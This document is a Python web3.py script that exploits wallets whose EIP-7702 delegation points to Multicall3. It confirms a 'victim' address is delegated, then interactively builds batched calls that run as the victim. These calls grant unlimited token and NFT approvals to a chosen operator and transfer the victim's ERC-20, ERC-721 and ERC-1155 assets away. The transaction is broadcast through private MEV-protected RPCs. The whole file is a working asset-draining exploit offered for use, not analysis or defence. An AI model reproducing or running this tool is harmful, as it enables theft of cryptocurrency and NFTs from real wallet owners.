"""
mulungeip7702.py
────────────────────────────────────────────────────────────────
Multicall3  aggregate3Value  via EIP-7702 delegated victim wallet
Requires web3 >= 7.0  (tested on 7.12.x)
────────────────────────────────────────────────────────────────
"""

import sys
import json
from decimal import Decimal
from web3 import Web3
from web3.exceptions import ContractLogicError
from eth_account import Account

# ─── Constants ────────────────────────────────────────────────
MULTICALL3_ADDR = Web3.to_checksum_address(
    "0xcA11bde05977b3631167028862bE2a173976CA11"
)
# EIP-7702 delegation prefix  0xef0100
EIP7702_PREFIX = bytes.fromhex("ef0100")

# ─── MEV-protected send endpoints ────────────────────────────
# Used only for send_raw_transaction to avoid sandwich attacks.
# All reads (eth_call, estimate_gas, receipts) still use the user RPC.
MEV_PROTECTED_RPC: dict[int, str] = {
    1:  "https://rpc.flashbots.net/fast",    # Ethereum mainnet → Flashbots
    56: "https://bscrpc.pancakeswap.finance", # BSC mainnet     → PancakeSwap
}

# ─── ABIs ─────────────────────────────────────────────────────
MULTICALL3_ABI = [
    {
        "name": "aggregate3Value",
        "type": "function",
        "stateMutability": "payable",
        "inputs": [
            {
                "name": "calls",
                "type": "tuple[]",
                "components": [
                    {"name": "target",       "type": "address"},
                    {"name": "allowFailure", "type": "bool"},
                    {"name": "value",        "type": "uint256"},
                    {"name": "callData",     "type": "bytes"},
                ],
            }
        ],
        "outputs": [
            {
                "name": "returnData",
                "type": "tuple[]",
                "components": [
                    {"name": "success",    "type": "bool"},
                    {"name": "returnData", "type": "bytes"},
                ],
            }
        ],
    }
]

ERC20_ABI = [
    {
        "name": "approve",
        "type": "function",
        "stateMutability": "nonpayable",
        "inputs": [
            {"name": "spender", "type": "address"},
            {"name": "amount",  "type": "uint256"},
        ],
        "outputs": [{"type": "bool"}],
    },
    {
        "name": "transfer",
        "type": "function",
        "stateMutability": "nonpayable",
        "inputs": [
            {"name": "to",     "type": "address"},
            {"name": "amount", "type": "uint256"},
        ],
        "outputs": [{"type": "bool"}],
    },
    {
        "name": "balanceOf",
        "type": "function",
        "stateMutability": "view",
        "inputs": [{"name": "account", "type": "address"}],
        "outputs": [{"type": "uint256"}],
    },
    {
        "name": "decimals",
        "type": "function",
        "stateMutability": "view",
        "inputs": [],
        "outputs": [{"type": "uint8"}],
    },
]

NFT_ABI = [
    {
        "name": "setApprovalForAll",
        "type": "function",
        "stateMutability": "nonpayable",
        "inputs": [
            {"name": "operator", "type": "address"},
            {"name": "approved", "type": "bool"},
        ],
        "outputs": [],
    },
    {
        "name": "safeTransferFrom",
        "type": "function",
        "stateMutability": "nonpayable",
        "inputs": [
            {"name": "from",    "type": "address"},
            {"name": "to",      "type": "address"},
            {"name": "tokenId", "type": "uint256"},
        ],
        "outputs": [],
    },
]

ERC1155_ABI = [
    {
        "name": "setApprovalForAll",
        "type": "function",
        "stateMutability": "nonpayable",
        "inputs": [
            {"name": "operator", "type": "address"},
            {"name": "approved", "type": "bool"},
        ],
        "outputs": [],
    },
    {
        "name": "safeTransferFrom",
        "type": "function",
        "stateMutability": "nonpayable",
        "inputs": [
            {"name": "from",    "type": "address"},
            {"name": "to",      "type": "address"},
            {"name": "id",      "type": "uint256"},
            {"name": "amount",  "type": "uint256"},
            {"name": "data",    "type": "bytes"},
        ],
        "outputs": [],
    },
]

# ─── Helpers ──────────────────────────────────────────────────

def banner(text: str):
    print(f"\n{'═'*60}")
    print(f"  {text}")
    print(f"{'═'*60}")

def prompt(label: str, default: str = "") -> str:
    suffix = f" [{default}]" if default else ""
    val = input(f"  ▶  {label}{suffix}: ").strip()
    return val if val else default

def prompt_int(label: str, default: int = 0) -> int:
    raw = prompt(label, str(default))
    try:
        return int(raw)
    except ValueError:
        print(f"     ! Invalid integer, using {default}")
        return default

def prompt_addr(label: str) -> str:
    while True:
        raw = prompt(label)
        try:
            return Web3.to_checksum_address(raw)
        except Exception:
            print("     ! Invalid address, try again.")

def check_eip7702_delegation(w3: Web3, victim: str) -> bool:
    """
    Return True if victim's code starts with 0xef0100 followed by
    exactly the MULTICALL3 address (20 bytes), which is how EIP-7702
    encodes delegation in the account's code field.
    """
    code: bytes = w3.eth.get_code(Web3.to_checksum_address(victim))
    if len(code) != 23:
        return False
    if code[:3] != EIP7702_PREFIX:
        return False
    delegated_to = Web3.to_checksum_address("0x" + code[3:].hex())
    return delegated_to.lower() == MULTICALL3_ADDR.lower()

def uint256_max() -> int:
    return 2**256 - 1

# ─── Calldata builders ────────────────────────────────────────

def _abi_to_bytes(hex_str: str) -> bytes:
    """web3.py v7: encode_abi returns HexStr '0x...'; convert to raw bytes."""
    return bytes.fromhex(hex_str.removeprefix("0x"))

def build_erc20_approve_unli(w3: Web3, token_addr: str, spender: str) -> bytes:
    c = w3.eth.contract(address=Web3.to_checksum_address(token_addr), abi=ERC20_ABI)
    return _abi_to_bytes(c.encode_abi(abi_element_identifier="approve", args=[
        Web3.to_checksum_address(spender),
        uint256_max(),
    ]))

def build_erc20_transfer(w3: Web3, token_addr: str, recipient: str, amount: int) -> bytes:
    c = w3.eth.contract(address=Web3.to_checksum_address(token_addr), abi=ERC20_ABI)
    return _abi_to_bytes(c.encode_abi(abi_element_identifier="transfer", args=[
        Web3.to_checksum_address(recipient),
        amount,
    ]))

def build_nft_approve_all(w3: Web3, nft_addr: str, operator: str) -> bytes:
    c = w3.eth.contract(address=Web3.to_checksum_address(nft_addr), abi=NFT_ABI)
    return _abi_to_bytes(c.encode_abi(abi_element_identifier="setApprovalForAll", args=[
        Web3.to_checksum_address(operator),
        True,
    ]))

def build_erc721_safe_transfer(w3: Web3, nft_addr: str,
                                from_: str, to_: str, token_id: int) -> bytes:
    c = w3.eth.contract(address=Web3.to_checksum_address(nft_addr), abi=NFT_ABI)
    return _abi_to_bytes(c.encode_abi(abi_element_identifier="safeTransferFrom", args=[
        Web3.to_checksum_address(from_),
        Web3.to_checksum_address(to_),
        token_id,
    ]))

def build_erc1155_safe_transfer(w3: Web3, nft_addr: str,
                                 from_: str, to_: str,
                                 token_id: int, amount: int) -> bytes:
    c = w3.eth.contract(address=Web3.to_checksum_address(nft_addr), abi=ERC1155_ABI)
    return _abi_to_bytes(c.encode_abi(abi_element_identifier="safeTransferFrom", args=[
        Web3.to_checksum_address(from_),
        Web3.to_checksum_address(to_),
        token_id,
        amount,
        b"",
    ]))

def build_erc1155_approve_all(w3: Web3, nft_addr: str, operator: str) -> bytes:
    c = w3.eth.contract(address=Web3.to_checksum_address(nft_addr), abi=ERC1155_ABI)
    return _abi_to_bytes(c.encode_abi(abi_element_identifier="setApprovalForAll", args=[
        Web3.to_checksum_address(operator),
        True,
    ]))

# ─── Call builder UI ─────────────────────────────────────────

def build_calls(w3: Web3, victim_addr: str) -> list[dict]:
    """Interactive builder for Call3Value[] tuples."""
    calls = []
    CALLDATA_MENU = {
        "1": "ERC20 approve unlimited",
        "2": "ERC20 transfer",
        "3": "ERC721 setApprovalForAll",
        "4": "ERC721 safeTransferFrom",
        "5": "ERC1155 setApprovalForAll",
        "6": "ERC1155 safeTransferFrom",
        "7": "Custom raw calldata",
    }

    while True:
        banner(f"Call #{len(calls)+1}  (enter 'd' when done)")

        # ── Target ──────────────────────────────────────────
        print("\n  Target type:")
        print("    1) Custom address")
        print("    2) ERC-20")
        print("    3) ERC-721")
        print("    4) ERC-1155")
        ttype = prompt("Choice", "1")
        target = prompt_addr("Target contract address")

        # ── Value ───────────────────────────────────────────
        val_str = prompt("ETH value to send with this sub-call (wei, default 0)", "0")
        try:
            call_value = int(val_str)
        except ValueError:
            call_value = 0

        # ── Calldata ────────────────────────────────────────
        print("\n  Calldata type:")
        for k, v in CALLDATA_MENU.items():
            print(f"    {k}) {v}")
        cd_choice = prompt("Choice", "1")

        calldata = b""
        if cd_choice == "1":
            spender = prompt_addr("Spender address")
            calldata = build_erc20_approve_unli(w3, target, spender)

        elif cd_choice == "2":
            recipient = prompt_addr("Recipient address")
            amt_str = prompt("Amount (in token units, e.g. 1.5)")
            try:
                c = w3.eth.contract(address=Web3.to_checksum_address(target), abi=ERC20_ABI)
                decimals = c.functions.decimals().call()
                amount = int(Decimal(amt_str) * Decimal(10 ** decimals))
            except Exception:
                amount = int(Decimal(amt_str))
            calldata = build_erc20_transfer(w3, target, recipient, amount)

        elif cd_choice == "3":
            operator = prompt_addr("Operator address")
            calldata = build_nft_approve_all(w3, target, operator)

        elif cd_choice == "4":
            to_ = prompt_addr("To address")
            token_id = prompt_int("Token ID", 0)
            calldata = build_erc721_safe_transfer(w3, target, victim_addr, to_, token_id)

        elif cd_choice == "5":
            operator = prompt_addr("Operator address")
            calldata = build_erc1155_approve_all(w3, target, operator)

        elif cd_choice == "6":
            to_ = prompt_addr("To address")
            token_id = prompt_int("Token ID", 0)
            amount_1155 = prompt_int("Amount", 1)
            calldata = build_erc1155_safe_transfer(
                w3, target, victim_addr, to_, token_id, amount_1155
            )

        elif cd_choice == "7":
            raw_hex = prompt("Raw calldata hex (with or without 0x)")
            raw_hex = raw_hex.removeprefix("0x")
            calldata = bytes.fromhex(raw_hex)

        calls.append({
            "target":       Web3.to_checksum_address(target),
            "allowFailure": False,
            "value":        call_value,
            "callData":     calldata,
        })

        print(f"\n  ✔ Call #{len(calls)} added  (target={target}  value={call_value}  len_cd={len(calldata)})")
        again = prompt("\n  Add another call? (y/n)", "n").lower()
        if again != "y":
            break

    return calls

# ─── Main ─────────────────────────────────────────────────────

def main():
    banner("mulungeip7702.py  –  Multicall3 aggregate3Value via EIP-7702")

    # ── RPC ────────────────────────────────────────────────────
    rpc_url = prompt("RPC URL")
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    if not w3.is_connected():
        print("  ✗ Cannot connect to RPC. Aborting.")
        sys.exit(1)

    chain_id = w3.eth.chain_id
    print(f"  ✔ Connected  |  chain_id = {chain_id}")

    # ── MEV-protected sender RPC ───────────────────────────────
    protected_url = MEV_PROTECTED_RPC.get(chain_id)
    if protected_url:
        w3_send = Web3(Web3.HTTPProvider(protected_url))
        print(f"  ✔ MEV-protected send RPC : {protected_url}")
    else:
        w3_send = w3   # no special protection; use same RPC
        print(f"  ℹ  No MEV-protected RPC for chain {chain_id}; using user RPC for send")

    # ── Sender private key ─────────────────────────────────────
    pk = prompt("Sender private key (hex, with or without 0x)")
    pk = pk if pk.startswith("0x") else "0x" + pk
    sender_account = Account.from_key(pk)
    sender = sender_account.address
    print(f"  ✔ Sender     : {sender}")

    # ── Victim address ─────────────────────────────────────────
    victim_addr = prompt_addr("Victim (delegating) address")

    # ── EIP-7702 delegation check ──────────────────────────────
    print(f"\n  Checking EIP-7702 delegation for {victim_addr} …")
    delegated = check_eip7702_delegation(w3, victim_addr)
    if delegated:
        print(f"  ✔ Confirmed: account is delegated to Multicall3 ({MULTICALL3_ADDR})")
    else:
        code = w3.eth.get_code(Web3.to_checksum_address(victim_addr)).hex()
        print(f"  ✗ NOT delegated to Multicall3!")
        print(f"     code bytes = {code if code else '(empty)'}")
        proceed = prompt("  Continue anyway? (y/n)", "n").lower()
        if proceed != "y":
            print("  Aborted.")
            sys.exit(0)

    # ── Build calls ────────────────────────────────────────────
    calls = build_calls(w3, victim_addr)
    if not calls:
        print("  No calls specified. Exiting.")
        sys.exit(0)

    # ── Total ETH value across all sub-calls ──────────────────
    total_value = sum(c["value"] for c in calls)

    # ── Encode aggregate3Value calldata ───────────────────────
    # web3.py v7: encode_abi() returns HexStr; args is a list of *positional*
    # arguments — aggregate3Value takes ONE arg (the tuple[] array), so args
    # must be [ [tuple, tuple, ...] ]  (outer list = positional args,
    #                                   inner list = the Call3Value[] array)
    mc = w3.eth.contract(address=MULTICALL3_ADDR, abi=MULTICALL3_ABI)
    tx_data = mc.encode_abi(
        abi_element_identifier="aggregate3Value",
        args=[[
            (
                c["target"],
                c["allowFailure"],
                c["value"],
                c["callData"],
            ) for c in calls
        ]],
    )
    
    # ── tx.to  =  victim address  (EIP-7702 executes code there) ──
    tx_to = victim_addr

    # ── Gas price (EIP-1559 type 2) ───────────────────────────
    # max_fee_per_gas  = base_fee + 15%
    # max_priority_fee = 10% of max_fee_per_gas
    latest = w3.eth.get_block("latest")
    base_fee         = latest["baseFeePerGas"]              # wei
    max_fee_per_gas  = int(base_fee * 1.15)                # base + 15%
    max_priority_fee = int(max_fee_per_gas * 0.10)         # 10% of max fee

    print(f"\n  baseFeePerGas          = {w3.from_wei(base_fee, 'gwei'):.6f} gwei")
    print(f"  maxFeePerGas  (+15%)   = {w3.from_wei(max_fee_per_gas, 'gwei'):.6f} gwei")
    print(f"  maxPriorityFee (10%)   = {w3.from_wei(max_priority_fee, 'gwei'):.6f} gwei")

    # ── Gas estimate ──────────────────────────────────────────
    nonce = w3.eth.get_transaction_count(sender, "pending")
    estimate_tx = {
        "from":  sender,
        "to":    tx_to,
        "value": total_value,
        "data":  tx_data,
        "chainId": chain_id,
    }
    try:
        gas_estimate = w3.eth.estimate_gas(estimate_tx)
    except (ContractLogicError, Exception) as exc:
        print(f"\n  ✗ Gas estimation failed: {exc}")
        # gas_estimate = prompt_int("Fallback gas limit", 500_000)
        exit()

    gas_limit = int(gas_estimate * 1.10)   # +10 %
    print(f"\n  Gas estimate      = {gas_estimate}")
    print(f"  Gas limit (+10%)  = {gas_limit}")

    # ── Transaction dict ──────────────────────────────────────
    tx = {
        "type":                 2,
        "chainId":              chain_id,
        "nonce":                nonce,
        "to":                   tx_to,
        "value":                total_value,
        "data":                 tx_data,
        "gas":                  gas_limit,
        "maxFeePerGas":         max_fee_per_gas,
        "maxPriorityFeePerGas": max_priority_fee,
    }

    # ── Summary ───────────────────────────────────────────────
    banner("Transaction Summary")
    print(f"  to (victim)       : {tx_to}")
    print(f"  from (sender)     : {sender}")
    print(f"  value             : {w3.from_wei(total_value, 'ether')} ETH")
    print(f"  gas               : {gas_limit}")
    print(f"  maxFeePerGas      : {w3.from_wei(max_fee_per_gas, 'gwei'):.4f} gwei")
    print(f"  maxPriorityFee    : {w3.from_wei(max_priority_fee, 'gwei'):.4f} gwei")
    print(f"  nonce             : {nonce}")
    print(f"  calls count       : {len(calls)}")
    for i, c in enumerate(calls):
        print(f"    [{i}] target={c['target']}  value={c['value']}  "
              f"allowFailure={c['allowFailure']}  cd_len={len(c['callData'])}")

    # ── Expected cost ─────────────────────────────────────────
    max_cost_wei  = gas_limit * max_fee_per_gas + total_value
    est_cost_wei  = gas_estimate * (base_fee + max_priority_fee) + total_value
    print(f"\n  Expected gas cost : ~{w3.from_wei(est_cost_wei, 'ether'):.8f} ETH")
    print(f"  Max gas cost      : ~{w3.from_wei(max_cost_wei,  'ether'):.8f} ETH")

    # ── Confirm ───────────────────────────────────────────────
    confirm = prompt("\n  Sign and broadcast? (y/n)", "n").lower()
    if confirm != "y":
        print("  Cancelled. Tx not sent.")
        sys.exit(0)

    # ── Sign & send ───────────────────────────────────────────
    # send_raw_transaction goes through the MEV-protected endpoint
    # (Flashbots fast / PancakeSwap BSC) to avoid sandwich bots.
    # Receipt polling still uses the original user RPC (w3).
    signed = w3.eth.account.sign_transaction(tx, private_key=pk)
    tx_hash = w3_send.eth.send_raw_transaction(signed.raw_transaction)
    print(f"\n  ✔ Tx sent!  hash = {tx_hash.hex()}")

    # ── Wait for receipt ──────────────────────────────────────
    wait = prompt("  Wait for receipt? (y/n)", "y").lower()
    if wait == "y":
        print("  Waiting …")
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
        status   = "✔ SUCCESS" if receipt["status"] == 1 else "✗ REVERTED"
        gas_used = receipt["gasUsed"]
        actual_cost = gas_used * receipt.get("effectiveGasPrice", max_fee_per_gas)
        print(f"\n  {status}")
        print(f"  Block             : {receipt['blockNumber']}")
        print(f"  Gas used          : {gas_used}")
        print(f"  Actual cost       : {w3.from_wei(actual_cost, 'ether'):.8f} ETH")

        # Print per-call return data from aggregate3Value
        if receipt["status"] == 1:
            print("\n  Return data (aggregate3Value):")
            try:
                result = mc.decode_function_input(tx_data)
                print(f"  (calldata decoded: {len(result[1]['calls'])} calls)")
            except Exception:
                pass

if __name__ == "__main__":
    main()
